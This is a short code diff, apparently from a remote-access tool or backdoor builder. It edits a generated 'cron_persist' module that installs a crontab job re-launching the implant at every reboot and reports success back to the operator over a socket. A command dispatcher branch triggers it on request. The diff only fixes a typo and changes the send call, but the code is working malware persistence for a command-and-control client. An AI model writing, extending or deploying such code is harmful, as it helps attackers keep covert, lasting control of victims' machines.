@@ -22,8 +22,7 @@ def cron_persist():
         job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
     job.every_reboot() 
     cron.write()
-    s.sendall('[+]Acheived persistence via cron job!'.encode())
-''')
+    main_send('[+]Achieved persistence via cron job', s)''')
         config.logics.append('''
             elif command == "cron_persist":
                 cron_persist()''')
